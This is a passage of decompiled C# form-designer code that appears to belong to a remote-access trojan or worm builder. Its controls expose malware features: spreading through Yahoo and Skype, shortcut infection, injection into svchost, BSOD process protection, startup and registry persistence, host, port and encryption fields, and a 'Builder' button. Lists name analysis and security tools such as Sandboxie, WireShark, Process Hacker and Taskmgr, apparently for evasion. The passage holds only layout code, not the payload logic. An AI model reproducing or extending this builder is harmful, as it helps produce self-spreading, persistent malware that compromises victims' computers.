			this.PictureBox3.Image = (Image)componentResourceManager.GetObject("PictureBox3.Image");
			Control arg_1532_0 = this.PictureBox3;
			location = new Point(565, 164);
			arg_1532_0.Location = location;
			this.PictureBox3.Name = "PictureBox3";
			Control arg_155D_0 = this.PictureBox3;
			size = new Size(30, 28);
			arg_155D_0.Size = size;
			this.PictureBox3.SizeMode = PictureBoxSizeMode.StretchImage;
			this.PictureBox3.TabIndex = 48;
			this.PictureBox3.TabStop = false;
			this.GroupBox5.BackColor = Color.Black;
			this.GroupBox5.Controls.Add(this.Anti);
			this.GroupBox5.Controls.Add(this.ty8);
			this.GroupBox5.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			Control arg_15FF_0 = this.GroupBox5;
			location = new Point(249, 47);
			arg_15FF_0.Location = location;
			this.GroupBox5.Name = "GroupBox5";
			Control arg_1630_0 = this.GroupBox5;
			size = new Size(184, 191);
			arg_1630_0.Size = size;
			this.GroupBox5.TabIndex = 44;
			this.GroupBox5.TabStop = false;
			this.PictureBox2.BackColor = Color.Black;
			this.PictureBox2.Image = (Image)componentResourceManager.GetObject("PictureBox2.Image");
			Control arg_1695_0 = this.PictureBox2;
			location = new Point(522, 81);
			arg_1695_0.Location = location;
			this.PictureBox2.Name = "PictureBox2";
			Control arg_16C0_0 = this.PictureBox2;
			size = new Size(30, 28);
			arg_16C0_0.Size = size;
			this.PictureBox2.SizeMode = PictureBoxSizeMode.StretchImage;
			this.PictureBox2.TabIndex = 39;
			this.PictureBox2.TabStop = false;
			this.GroupBox6.BackColor = Color.Black;
			this.GroupBox6.Controls.Add(this.LinkLabel6);
			this.GroupBox6.Controls.Add(this.LinkLabel5);
			this.GroupBox6.Controls.Add(this.LinkLabel4);
			this.GroupBox6.Controls.Add(this.LinkLabel3);
			this.GroupBox6.Controls.Add(this.LinkLabel2);
			this.GroupBox6.Controls.Add(this.LinkLabel1);
			this.GroupBox6.Controls.Add(this.Label23);
			this.GroupBox6.Controls.Add(this.Label22);
			this.GroupBox6.Controls.Add(this.Label21);
			this.GroupBox6.Controls.Add(this.CM_Yahoo);
			this.GroupBox6.Controls.Add(this.CH_p2p);
			this.GroupBox6.Controls.Add(this.Melt);
			this.GroupBox6.Controls.Add(this.CH_Infect);
			this.GroupBox6.Controls.Add(this.US);
			this.GroupBox6.Controls.Add(this.Spre);
			this.GroupBox6.ForeColor = Color.White;
			Control arg_187D_0 = this.GroupBox6;
			location = new Point(10, 15);
			arg_187D_0.Location = location;
			this.GroupBox6.Name = "GroupBox6";
			Control arg_18AE_0 = this.GroupBox6;
			size = new Size(239, 186);
			arg_18AE_0.Size = size;
			this.GroupBox6.TabIndex = 45;
			this.GroupBox6.TabStop = false;
			this.GroupBox6.Text = "Spread";
			this.LinkLabel6.AutoSize = true;
			this.LinkLabel6.Cursor = Cursors.Hand;
			this.LinkLabel6.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.LinkLabel6.LinkColor = Color.Magenta;
			Control arg_1944_0 = this.LinkLabel6;
			location = new Point(118, 232);
			arg_1944_0.Location = location;
			this.LinkLabel6.Name = "LinkLabel6";
			Control arg_196F_0 = this.LinkLabel6;
			size = new Size(19, 20);
			arg_196F_0.Size = size;
			this.LinkLabel6.TabIndex = 68;
			this.LinkLabel6.TabStop = true;
			this.LinkLabel6.Text = "?";
			this.LinkLabel5.AutoSize = true;
			this.LinkLabel5.Cursor = Cursors.Hand;
			this.LinkLabel5.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.LinkLabel5.LinkColor = Color.Magenta;
			Control arg_1A05_0 = this.LinkLabel5;
			location = new Point(117, 191);
			arg_1A05_0.Location = location;
			this.LinkLabel5.Name = "LinkLabel5";
			Control arg_1A30_0 = this.LinkLabel5;
			size = new Size(19, 20);
			arg_1A30_0.Size = size;
			this.LinkLabel5.TabIndex = 67;
			this.LinkLabel5.TabStop = true;
			this.LinkLabel5.Text = "?";
			this.LinkLabel4.AutoSize = true;
			this.LinkLabel4.Cursor = Cursors.Hand;
			this.LinkLabel4.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.LinkLabel4.LinkColor = Color.Magenta;
			Control arg_1AC9_0 = this.LinkLabel4;
			location = new Point(134, 148);
			arg_1AC9_0.Location = location;
			this.LinkLabel4.Name = "LinkLabel4";
			Control arg_1AF4_0 = this.LinkLabel4;
			size = new Size(19, 20);
			arg_1AF4_0.Size = size;
			this.LinkLabel4.TabIndex = 66;
			this.LinkLabel4.TabStop = true;
			this.LinkLabel4.Text = "?";
			this.LinkLabel3.AutoSize = true;
			this.LinkLabel3.Cursor = Cursors.Hand;
			this.LinkLabel3.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.LinkLabel3.LinkColor = Color.Magenta;
			Control arg_1B8A_0 = this.LinkLabel3;
			location = new Point(141, 104);
			arg_1B8A_0.Location = location;
			this.LinkLabel3.Name = "LinkLabel3";
			Control arg_1BB5_0 = this.LinkLabel3;
			size = new Size(19, 20);
			arg_1BB5_0.Size = size;
			this.LinkLabel3.TabIndex = 65;
			this.LinkLabel3.TabStop = true;
			this.LinkLabel3.Text = "?";
			this.LinkLabel2.AutoSize = true;
			this.LinkLabel2.Cursor = Cursors.Hand;
			this.LinkLabel2.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.LinkLabel2.LinkColor = Color.Magenta;
			Control arg_1C4B_0 = this.LinkLabel2;
			location = new Point(187, 22);
			arg_1C4B_0.Location = location;
			this.LinkLabel2.Name = "LinkLabel2";
			Control arg_1C76_0 = this.LinkLabel2;
			size = new Size(19, 20);
			arg_1C76_0.Size = size;
			this.LinkLabel2.TabIndex = 64;
			this.LinkLabel2.TabStop = true;
			this.LinkLabel2.Text = "?";
			this.LinkLabel1.AutoSize = true;
			this.LinkLabel1.Cursor = Cursors.Hand;
			this.LinkLabel1.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.LinkLabel1.LinkColor = Color.Magenta;
			Control arg_1D09_0 = this.LinkLabel1;
			location = new Point(105, 63);
			arg_1D09_0.Location = location;
			this.LinkLabel1.Name = "LinkLabel1";
			Control arg_1D34_0 = this.LinkLabel1;
			size = new Size(19, 20);
			arg_1D34_0.Size = size;
			this.LinkLabel1.TabIndex = 63;
			this.LinkLabel1.TabStop = true;
			this.LinkLabel1.Text = "?";
			this.Label23.AutoSize = true;
			this.Label23.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label23.ForeColor = Color.Lime;
			Control arg_1DB9_0 = this.Label23;
			location = new Point(209, 28);
			arg_1DB9_0.Location = location;
			this.Label23.Name = "Label23";
			Control arg_1DE4_0 = this.Label23;
			size = new Size(39, 13);
			arg_1DE4_0.Size = size;
			this.Label23.TabIndex = 62;
			this.Label23.Text = "(New)";
			this.Label22.AutoSize = true;
			this.Label22.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label22.ForeColor = Color.Lime;
			Control arg_1E5F_0 = this.Label22;
			location = new Point(139, 197);
			arg_1E5F_0.Location = location;
			this.Label22.Name = "Label22";
			Control arg_1E8A_0 = this.Label22;
			size = new Size(39, 13);
			arg_1E8A_0.Size = size;
			this.Label22.TabIndex = 61;
			this.Label22.Text = "(New)";
			this.Label21.AutoSize = true;
			this.Label21.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label21.ForeColor = Color.Lime;
			Control arg_1F05_0 = this.Label21;
			location = new Point(142, 239);
			arg_1F05_0.Location = location;
			this.Label21.Name = "Label21";
			Control arg_1F30_0 = this.Label21;
			size = new Size(39, 13);
			arg_1F30_0.Size = size;
			this.Label21.TabIndex = 60;
			this.Label21.Text = "(New)";
			this.CM_Yahoo.AutoSize = true;
			this.CM_Yahoo.BackColor = Color.Black;
			this.CM_Yahoo.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CM_Yahoo.ForeColor = Color.White;
			Control arg_1FB9_0 = this.CM_Yahoo;
			location = new Point(20, 236);
			arg_1FB9_0.Location = location;
			this.CM_Yahoo.Name = "CM_Yahoo";
			Control arg_1FE4_0 = this.CM_Yahoo;
			size = new Size(99, 17);
			arg_1FE4_0.Size = size;
			this.CM_Yahoo.TabIndex = 58;
			this.CM_Yahoo.Text = "Yahoo Spread";
			this.CM_Yahoo.UseVisualStyleBackColor = false;
			this.CH_p2p.AutoSize = true;
			this.CH_p2p.BackColor = Color.Black;
			this.CH_p2p.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CH_p2p.ForeColor = Color.White;
			Control arg_207A_0 = this.CH_p2p;
			location = new Point(20, 196);
			arg_207A_0.Location = location;
			this.CH_p2p.Name = "CH_p2p";
			Control arg_20A5_0 = this.CH_p2p;
			size = new Size(96, 17);
			arg_20A5_0.Size = size;
			this.CH_p2p.TabIndex = 52;
			this.CH_p2p.Text = "Skype Spread";
			this.CH_p2p.UseVisualStyleBackColor = false;
			this.Melt.AutoSize = true;
			this.Melt.BackColor = Color.Black;
			this.Melt.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Melt.ForeColor = Color.White;
			Control arg_213B_0 = this.Melt;
			location = new Point(20, 152);
			arg_213B_0.Location = location;
			this.Melt.Name = "Melt";
			Control arg_2166_0 = this.Melt;
			size = new Size(108, 17);
			arg_2166_0.Size = size;
			this.Melt.TabIndex = 50;
			this.Melt.Text = "Inject To Svhost";
			this.Melt.UseVisualStyleBackColor = false;
			this.CH_Infect.AutoSize = true;
			this.CH_Infect.BackColor = Color.Black;
			this.CH_Infect.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CH_Infect.ForeColor = Color.White;
			Control arg_21F9_0 = this.CH_Infect;
			location = new Point(20, 28);
			arg_21F9_0.Location = location;
			this.CH_Infect.Name = "CH_Infect";
			Control arg_2227_0 = this.CH_Infect;
			size = new Size(169, 17);
			arg_2227_0.Size = size;
			this.CH_Infect.TabIndex = 49;
			this.CH_Infect.Text = "Infect To Computer Shotcut";
			this.CH_Infect.UseVisualStyleBackColor = false;
			this.GroupBox7.BackColor = Color.Black;
			this.GroupBox7.Controls.Add(this.NyX_Button3);
			this.GroupBox7.Controls.Add(this.NyX_Button2);
			this.GroupBox7.Controls.Add(this.lbl_icones);
			this.GroupBox7.Controls.Add(this.Label18);
			this.GroupBox7.Controls.Add(this.CBIcones);
			this.GroupBox7.Controls.Add(this.Button1);
			this.GroupBox7.Controls.Add(this.LVIcones);
			this.GroupBox7.Controls.Add(this.Label17);
			this.GroupBox7.Controls.Add(this.CBTamanhoICO);
			this.GroupBox7.ForeColor = Color.White;
			Control arg_235C_0 = this.GroupBox7;
			location = new Point(6, 3);
			arg_235C_0.Location = location;
			this.GroupBox7.Name = "GroupBox7";
			Control arg_238D_0 = this.GroupBox7;
			size = new Size(689, 244);
			arg_238D_0.Size = size;
			this.GroupBox7.TabIndex = 46;
			this.GroupBox7.TabStop = false;
			this.GroupBox7.Text = "Icon";
			this.NyX_Button3.Colors = new Bloom[0];
			this.NyX_Button3.Cursor = Cursors.Hand;
			this.NyX_Button3.Customization = "";
			this.NyX_Button3.Font = new Font("Arial", 8f);
			this.NyX_Button3.Image = null;
			Control arg_242F_0 = this.NyX_Button3;
			location = new Point(34, 52);
			arg_242F_0.Location = location;
			this.NyX_Button3.Name = "NyX_Button3";
			this.NyX_Button3.NoRounding = false;
			Control arg_2467_0 = this.NyX_Button3;
			size = new Size(39, 25);
			arg_2467_0.Size = size;
			this.NyX_Button3.TabIndex = 42;
			this.NyX_Button3.Text = "X";
			this.NyX_Button3.Transparent = false;
			this.NyX_Button2.Colors = new Bloom[0];
			this.NyX_Button2.Cursor = Cursors.Hand;
			this.NyX_Button2.Customization = "";
			this.NyX_Button2.Font = new Font("Arial", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.NyX_Button2.Image = null;
			Control arg_250C_0 = this.NyX_Button2;
			location = new Point(34, 20);
			arg_250C_0.Location = location;
			this.NyX_Button2.Name = "NyX_Button2";
			this.NyX_Button2.NoRounding = false;
			Control arg_2544_0 = this.NyX_Button2;
			size = new Size(39, 25);
			arg_2544_0.Size = size;
			this.NyX_Button2.TabIndex = 41;
			this.NyX_Button2.Text = "+";
			this.NyX_Button2.Transparent = false;
			this.lbl_icones.AutoSize = true;
			this.lbl_icones.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			Control arg_25B8_0 = this.lbl_icones;
			location = new Point(77, 193);
			arg_25B8_0.Location = location;
			this.lbl_icones.Name = "lbl_icones";
			Control arg_25E3_0 = this.lbl_icones;
			size = new Size(52, 13);
			arg_25E3_0.Size = size;
			this.lbl_icones.TabIndex = 40;
			this.lbl_icones.Text = "Icones :0";
			this.Label18.AutoSize = true;
			this.Label18.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			Control arg_264A_0 = this.Label18;
			location = new Point(12, 146);
			arg_264A_0.Location = location;
			this.Label18.Name = "Label18";
			Control arg_2675_0 = this.Label18;
			size = new Size(32, 13);
			arg_2675_0.Size = size;
			this.Label18.TabIndex = 39;
			this.Label18.Text = "View";
			this.CBIcones.BackColor = Color.Black;
			this.CBIcones.DropDownStyle = ComboBoxStyle.DropDownList;
			this.CBIcones.FlatStyle = FlatStyle.Flat;
			this.CBIcones.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CBIcones.ForeColor = Color.White;
			this.CBIcones.FormattingEnabled = true;
			this.CBIcones.Items.AddRange(new object[]
			{
				"LargeIcon",
				"Details",
				"SmallIcon",
				"List",
				"Tile"
			});
			Control arg_2765_0 = this.CBIcones;
			location = new Point(9, 164);
			arg_2765_0.Location = location;
			this.CBIcones.Name = "CBIcones";
			Control arg_2793_0 = this.CBIcones;
			size = new Size(195, 21);
			arg_2793_0.Size = size;
			this.CBIcones.TabIndex = 38;
			this.Button1.FlatStyle = FlatStyle.Flat;
			this.Button1.Font = new Font("Segoe UI Symbol", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			Control arg_27E8_0 = this.Button1;
			location = new Point(7, 209);
			arg_27E8_0.Location = location;
			this.Button1.Name = "Button1";
			Control arg_2816_0 = this.Button1;
			size = new Size(195, 26);
			arg_2816_0.Size = size;
			this.Button1.TabIndex = 37;
			this.Button1.Text = "Refresh icon List";
			this.Button1.UseVisualStyleBackColor = true;
			this.LVIcones.BackColor = Color.Black;
			this.LVIcones.Columns.AddRange(new ColumnHeader[]
			{
				this.ColumnHeader2,
				this.ColumnHeader3
			});
			this.LVIcones.Cursor = Cursors.Hand;
			this.LVIcones.ForeColor = Color.White;
			this.LVIcones.LargeImageList = this.IM3;
			Control arg_28D5_0 = this.LVIcones;
			location = new Point(208, 14);
			arg_28D5_0.Location = location;
			this.LVIcones.Name = "LVIcones";
			Control arg_2906_0 = this.LVIcones;
			size = new Size(475, 224);
			arg_2906_0.Size = size;
			this.LVIcones.SmallImageList = this.IM3;
			this.LVIcones.TabIndex = 36;
			this.LVIcones.UseCompatibleStateImageBehavior = false;
			this.ColumnHeader2.Text = "Name";
			this.ColumnHeader2.Width = 174;
			this.ColumnHeader3.Text = "Directory";
			this.ColumnHeader3.Width = 175;
			this.IM3.ColorDepth = ColorDepth.Depth32Bit;
			ImageList arg_299F_0 = this.IM3;
			size = new Size(20, 20);
			arg_299F_0.ImageSize = size;
			this.IM3.TransparentColor = Color.Transparent;
			this.Label17.AutoSize = true;
			this.Label17.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			Control arg_29F5_0 = this.Label17;
			location = new Point(12, 104);
			arg_29F5_0.Location = location;
			this.Label17.Name = "Label17";
			Control arg_2A20_0 = this.Label17;
			size = new Size(27, 13);
			arg_2A20_0.Size = size;
			this.Label17.TabIndex = 35;
			this.Label17.Text = "Size";
			this.CBTamanhoICO.BackColor = Color.Black;
			this.CBTamanhoICO.DropDownStyle = ComboBoxStyle.DropDownList;
			this.CBTamanhoICO.FlatStyle = FlatStyle.Flat;
			this.CBTamanhoICO.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CBTamanhoICO.ForeColor = Color.White;
			this.CBTamanhoICO.FormattingEnabled = true;
			this.CBTamanhoICO.Items.AddRange(new object[]
			{
				"16,16",
				"24,24",
				"32,32",
				"48,48",
				"64;64"
			});
			Control arg_2B0D_0 = this.CBTamanhoICO;
			location = new Point(9, 122);
			arg_2B0D_0.Location = location;
			this.CBTamanhoICO.Name = "CBTamanhoICO";
			Control arg_2B3B_0 = this.CBTamanhoICO;
			size = new Size(195, 21);
			arg_2B3B_0.Size = size;
			this.CBTamanhoICO.TabIndex = 34;
			this.TabControl1.Controls.Add(this.TabPage1);
			this.TabControl1.Controls.Add(this.TabPage2);
			this.TabControl1.Controls.Add(this.TabPage3);
			this.TabControl1.Controls.Add(this.TabPage4);
			this.TabControl1.Controls.Add(this.TabPage8);
			this.TabControl1.Controls.Add(this.TabPage5);
			this.TabControl1.Controls.Add(this.TabPage6);
			this.TabControl1.Controls.Add(this.TabPage7);
			this.TabControl1.ImageList = this.imm;
			Control arg_2C2C_0 = this.TabControl1;
			location = new Point(0, -25);
			arg_2C2C_0.Location = location;
			this.TabControl1.Name = "TabControl1";
			this.TabControl1.SelectedIndex = 0;
			Control arg_2C6A_0 = this.TabControl1;
			size = new Size(449, 231);
			arg_2C6A_0.Size = size;
			this.TabControl1.TabIndex = 48;
			this.TabPage1.BackColor = Color.Black;
			this.TabPage1.Controls.Add(this.GroupBox9);
			this.TabPage1.Controls.Add(this.CheckBox2);
			this.TabPage1.ImageKey = "Hopstarter-Sleek-Xp-Basic-Download.ico";
			TabPage arg_2CE1_0 = this.TabPage1;
			location = new Point(4, 27);
			arg_2CE1_0.Location = location;
			this.TabPage1.Name = "TabPage1";
			Control arg_2D09_0 = this.TabPage1;
			Padding padding = new Padding(3);
			arg_2D09_0.Padding = padding;
			Control arg_2D29_0 = this.TabPage1;
			size = new Size(441, 200);
			arg_2D29_0.Size = size;
			this.TabPage1.TabIndex = 0;
			this.TabPage1.Text = "Connection";
			this.GroupBox9.BackColor = Color.Black;
			this.GroupBox9.Controls.Add(this.CheckBox4);
			this.GroupBox9.Controls.Add(this.bsod);
			this.GroupBox9.Controls.Add(this.startup);
			this.GroupBox9.Controls.Add(this.reg99);
			this.GroupBox9.Controls.Add(this.Del);
			this.GroupBox9.Controls.Add(this.Button2);
			this.GroupBox9.Controls.Add(this.Button3);
			this.GroupBox9.Controls.Add(this.CheckBox12);
			this.GroupBox9.Controls.Add(this.TextBox2);
			this.GroupBox9.Controls.Add(this.PictureBox1);
			this.GroupBox9.Controls.Add(this.CheckBox1);
			this.GroupBox9.Controls.Add(this.Tree2);
			this.GroupBox9.Controls.Add(this.tree1);
			this.GroupBox9.Controls.Add(this.dir);
			this.GroupBox9.Controls.Add(this.exe);
			this.GroupBox9.Controls.Add(this.Label16);
			this.GroupBox9.Controls.Add(this.Label15);
			this.GroupBox9.Controls.Add(this.txt_port);
			this.GroupBox9.Controls.Add(this.txt_encription);
			this.GroupBox9.Controls.Add(this.host);
			this.GroupBox9.Controls.Add(this.port);
			this.GroupBox9.Controls.Add(this.Label3);
			this.GroupBox9.Controls.Add(this.Label1);
			this.GroupBox9.Controls.Add(this.VN);
			this.GroupBox9.Controls.Add(this.Label2);
			this.GroupBox9.ForeColor = Color.White;
			Control arg_2FC2_0 = this.GroupBox9;
			location = new Point(-16, -10);
			arg_2FC2_0.Location = location;
			this.GroupBox9.Name = "GroupBox9";
			Control arg_2FF3_0 = this.GroupBox9;
			size = new Size(456, 215);
			arg_2FF3_0.Size = size;
			this.GroupBox9.TabIndex = 44;
			this.GroupBox9.TabStop = false;
			this.CheckBox4.AutoSize = true;
			this.CheckBox4.BackColor = Color.Black;
			this.CheckBox4.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CheckBox4.ForeColor = Color.LightSteelBlue;
			Control arg_3078_0 = this.CheckBox4;
			location = new Point(258, 121);
			arg_3078_0.Location = location;
			this.CheckBox4.Name = "CheckBox4";
			Control arg_30A3_0 = this.CheckBox4;
			size = new Size(91, 17);
			arg_30A3_0.Size = size;
			this.CheckBox4.TabIndex = 47;
			this.CheckBox4.Text = "Enable Copy";
			this.CheckBox4.UseVisualStyleBackColor = false;
			this.bsod.AutoSize = true;
			this.bsod.BackColor = Color.Black;
			this.bsod.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bsod.ForeColor = Color.LightSteelBlue;
			Control arg_3139_0 = this.bsod;
			location = new Point(258, 100);
			arg_3139_0.Location = location;
			this.bsod.Name = "bsod";
			Control arg_3167_0 = this.bsod;
			size = new Size(145, 17);
			arg_3167_0.Size = size;
			this.bsod.TabIndex = 43;
			this.bsod.Text = "Protect Prosess [BSOD]";
			this.bsod.UseVisualStyleBackColor = false;
			this.startup.AutoSize = true;
			this.startup.BackColor = Color.Black;
			this.startup.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.startup.ForeColor = Color.LightSteelBlue;
			Control arg_31FD_0 = this.startup;
			location = new Point(258, 54);
			arg_31FD_0.Location = location;
			this.startup.Name = "startup";
			Control arg_3228_0 = this.startup;
			size = new Size(95, 17);
			arg_3228_0.Size = size;
			this.startup.TabIndex = 45;
			this.startup.Text = "Copy StartUp";
			this.startup.UseVisualStyleBackColor = false;
			this.reg99.AutoSize = true;
			this.reg99.BackColor = Color.Black;
			this.reg99.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.reg99.ForeColor = Color.White;
			Control arg_32BE_0 = this.reg99;
			location = new Point(525, 36);
			arg_32BE_0.Location = location;
			this.reg99.Name = "reg99";
			Control arg_32E9_0 = this.reg99;
			size = new Size(68, 17);
			arg_32E9_0.Size = size;
			this.reg99.TabIndex = 46;
			this.reg99.Text = "Registry";
			this.reg99.UseVisualStyleBackColor = false;
			this.Del.AutoSize = true;
			this.Del.BackColor = Color.Black;
			this.Del.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Del.ForeColor = Color.White;
			Control arg_3382_0 = this.Del;
			location = new Point(593, 204);
			arg_3382_0.Location = location;
			this.Del.Name = "Del";
			Control arg_33AD_0 = this.Del;
			size = new Size(104, 17);
			arg_33AD_0.Size = size;
			this.Del.TabIndex = 44;
			this.Del.Text = "Delete archives";
			this.Del.UseVisualStyleBackColor = false;
			this.Button2.BackColor = Color.Black;
			this.Button2.FlatStyle = FlatStyle.Flat;
			this.Button2.ForeColor = Color.LightSteelBlue;
			Control arg_3428_0 = this.Button2;
			location = new Point(258, 166);
			arg_3428_0.Location = location;
			this.Button2.Name = "Button2";
			Control arg_3456_0 = this.Button2;
			size = new Size(145, 32);
			arg_3456_0.Size = size;
			this.Button2.TabIndex = 42;
			this.Button2.Text = "Builder";
			this.Button2.UseVisualStyleBackColor = false;
			this.Button3.BackColor = Color.Black;
			this.Button3.FlatStyle = FlatStyle.Flat;
			this.Button3.ForeColor = Color.LightSteelBlue;
			Control arg_34D1_0 = this.Button3;
			location = new Point(400, 166);
			arg_34D1_0.Location = location;
			this.Button3.Name = "Button3";
			Control arg_34FC_0 = this.Button3;
			size = new Size(48, 32);
			arg_34FC_0.Size = size;
			this.Button3.TabIndex = 41;
			this.Button3.Text = "MS";
			this.Button3.UseVisualStyleBackColor = false;
			this.CheckBox12.AutoSize = true;
			this.CheckBox12.BackColor = Color.Black;
			this.CheckBox12.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CheckBox12.ForeColor = Color.LightSteelBlue;
			Control arg_3592_0 = this.CheckBox12;
			location = new Point(258, 77);
			arg_3592_0.Location = location;
			this.CheckBox12.Name = "CheckBox12";
			Control arg_35BD_0 = this.CheckBox12;
			size = new Size(61, 17);
			arg_35BD_0.Size = size;
			this.CheckBox12.TabIndex = 40;
			this.CheckBox12.Text = "Enable";
			this.CheckBox12.UseVisualStyleBackColor = false;
			this.TextBox2.BackColor = Color.Black;
			this.TextBox2.BorderStyle = BorderStyle.FixedSingle;
			this.TextBox2.ForeColor = Color.LightSteelBlue;
			Control arg_3638_0 = this.TextBox2;
			location = new Point(258, 144);
			arg_3638_0.Location = location;
			this.TextBox2.Name = "TextBox2";
			Control arg_3666_0 = this.TextBox2;
			size = new Size(190, 21);
			arg_3666_0.Size = size;
			this.TextBox2.TabIndex = 36;
			this.TextBox2.Text = "        Nashygtujtrfg2012reer";
			this.PictureBox1.BackColor = Color.Black;
			this.PictureBox1.BorderStyle = BorderStyle.FixedSingle;
			Control arg_36C0_0 = this.PictureBox1;
			location = new Point(337, 18);
			arg_36C0_0.Location = location;
			this.PictureBox1.Name = "PictureBox1";
			Control arg_36EB_0 = this.PictureBox1;
			size = new Size(47, 30);
			arg_36EB_0.Size = size;
			this.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
			this.PictureBox1.TabIndex = 35;
			this.PictureBox1.TabStop = false;
			this.CheckBox1.AutoSize = true;
			this.CheckBox1.BackColor = Color.Black;
			this.CheckBox1.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CheckBox1.ForeColor = Color.LightSteelBlue;
			Control arg_377D_0 = this.CheckBox1;
			location = new Point(258, 31);
			arg_377D_0.Location = location;
			this.CheckBox1.Name = "CheckBox1";
			Control arg_37A8_0 = this.CheckBox1;
			size = new Size(48, 17);
			arg_37A8_0.Size = size;
			this.CheckBox1.TabIndex = 34;
			this.CheckBox1.Text = "Icon";
			this.CheckBox1.UseVisualStyleBackColor = false;
			this.Tree2.BackColor = Color.Black;
			this.Tree2.BorderStyle = BorderStyle.None;
			this.Tree2.Enabled = false;
			this.Tree2.ForeColor = Color.White;
			this.Tree2.LineColor = Color.Red;
			Control arg_3841_0 = this.Tree2;
			location = new Point(593, 171);
			arg_3841_0.Location = location;
			this.Tree2.Name = "Tree2";
			treeNode.Name = "Node0";
			treeNode.Text = "MS Config";
			treeNode2.Name = "Node1";
			treeNode2.Text = "exeinfoPE";
			treeNode3.Name = "Node2";
			treeNode3.Text = "NetSnifferCs";
			treeNode4.Name = "Node3";
			treeNode4.Text = "Codereflect";
			treeNode5.Name = "Node4";
			treeNode5.Text = "DNS Spy";
			treeNode6.Name = "Node5";
			treeNode6.Text = "NET Reflector";
			this.Tree2.Nodes.AddRange(new TreeNode[]
			{
				treeNode,
				treeNode2,
				treeNode3,
				treeNode4,
				treeNode5,
				treeNode6
			});
			Control arg_394D_0 = this.Tree2;
			size = new Size(167, 10);
			arg_394D_0.Size = size;
			this.Tree2.TabIndex = 31;
			this.tree1.BackColor = Color.Black;
			this.tree1.BorderStyle = BorderStyle.None;
			this.tree1.Enabled = false;
			this.tree1.ForeColor = Color.White;
			this.tree1.LineColor = Color.Red;
			Control arg_39C5_0 = this.tree1;
			location = new Point(599, 33);
			arg_39C5_0.Location = location;
			this.tree1.Name = "tree1";
			treeNode7.Name = "Node0";
			treeNode7.Text = "Spy The Spy";
			treeNode8.Name = "Node1";
			treeNode8.Text = "Sandboxie";
			treeNode9.Name = "Node2";
			treeNode9.Text = "Il Spy";
			treeNode10.Name = "Node3";
			treeNode10.Text = "Reflector";
			treeNode11.Name = "Node4";
			treeNode11.Text = "ByPass FireWall";
			treeNode12.Name = "Node5";
			treeNode12.Text = "WireShark";
			treeNode13.Name = "Node6";
			treeNode13.Text = "AppateDNS";
			treeNode14.Name = "Node7";
			treeNode14.Text = "IP Blocker";
			treeNode15.Name = "Node8";
			treeNode15.Text = "TiGer-FireWall";
			treeNode16.Name = "Node9";
			treeNode16.Text = "Process Hacker";
			treeNode17.Name = "Node10";
			treeNode17.Text = "Taskmgr";
			this.tree1.Nodes.AddRange(new TreeNode[]
			{
				treeNode7,
				treeNode8,
				treeNode9,
				treeNode10,
				treeNode11,
				treeNode12,
				treeNode13,
				treeNode14,
				treeNode15,
				treeNode16,
				treeNode17
			});
			Control arg_3B73_0 = this.tree1;
			size = new Size(102, 111);
			arg_3B73_0.Size = size;
			this.tree1.TabIndex = 30;
			this.dir.BackColor = Color.Black;
			this.dir.DropDownStyle = ComboBoxStyle.DropDownList;
			this.dir.FlatStyle = FlatStyle.Flat;
			this.dir.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.dir.ForeColor = Color.LightSteelBlue;
			this.dir.FormattingEnabled = true;
			this.dir.Items.AddRange(new object[]
			{
				"%TEMP%",
				"%AppData%",
				"%UserProfile%",
				"%ProgramData%"
			});
			Control arg_3C48_0 = this.dir;
			location = new Point(22, 176);
			arg_3C48_0.Location = location;
			this.dir.Name = "dir";
			Control arg_3C76_0 = this.dir;
			size = new Size(208, 21);
			arg_3C76_0.Size = size;
			this.dir.TabIndex = 29;
			this.exe.BackColor = Color.Black;
			this.exe.BorderStyle = BorderStyle.FixedSingle;
			this.exe.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.exe.ForeColor = Color.LightSteelBlue;
